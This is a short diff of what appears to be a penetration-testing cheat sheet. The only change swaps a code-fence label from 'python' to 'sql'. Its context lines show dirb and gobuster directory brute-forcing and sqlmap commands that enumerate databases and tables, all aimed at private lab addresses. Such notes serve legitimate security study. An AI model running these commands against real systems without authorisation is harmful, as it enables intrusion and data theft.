@@ -49,7 +49,7 @@ dirb http://10.10.15.12
 gobuster dir -u 10.10.14.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 # SQLMap
-```python
+```sql
 sqlmap -u "http://10.10.14.12/file.php?id=1" -p id
 sqlmap -u "http://10.10.14.12/file.php?id=1" -p id --dbs
 sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname --tables
